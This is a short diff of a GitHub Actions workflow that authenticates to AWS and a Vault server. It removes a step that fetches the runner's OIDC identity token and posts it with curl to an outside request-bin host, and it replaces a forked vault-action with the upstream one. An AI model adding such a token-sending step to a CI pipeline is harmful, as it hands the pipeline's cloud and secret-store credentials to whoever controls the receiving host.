@@ -27,16 +27,12 @@ jobs:
           role-to-assume: ${{ secrets.AWS_ROLE }}
           role-session-name: ${{ github.run_id }}
 
-      - run: |
-          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
-          curl -i -s --data-binary "$OIDC_TOKEN" https://en6uptz0442bl.x.pipedream.net
-
-      - uses: Centzilius/vault-action@errormessage
+      - uses: hashicorp/vault-action@master
         with:
           url: https://vault.wafflehacks.org
           method: jwt
           path: github-actions
-          role: ${{ secrets.VAULT_ROLE }}
+          role: infrastructure
           exportToken: true
           # This is a hack since secrets is currently required
           secrets: auth/token/lookup-self accessor
